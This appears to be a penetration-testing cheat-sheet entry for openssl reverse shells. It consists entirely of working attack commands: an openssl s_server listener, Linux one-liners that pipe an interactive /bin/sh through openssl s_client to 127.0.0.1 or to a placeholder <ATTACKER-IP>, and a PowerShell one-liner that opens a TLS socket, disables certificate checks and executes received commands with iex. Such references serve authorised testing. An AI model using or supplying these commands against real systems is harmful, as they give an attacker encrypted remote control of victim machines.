# openssl

Listener:
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

Linux Client:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -CAfile /tmp/cert.pem -verify_return_error -verify 1 -connect 127.0.0.1:443 > /tmp/s; rm /tmp/s
(or)
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s

Windows Client:
$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', 443);$stream = $socket.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$sslStream.AuthenticateAsClient('fake.domain');$writer = new-object System.IO.StreamWriter($sslStream);$writer.Write('PS ' + (pwd).Path + '> ');$writer.flush();[byte[]]$bytes = 0..65535|%{0};while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data | Out-String ) 2>&1;$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
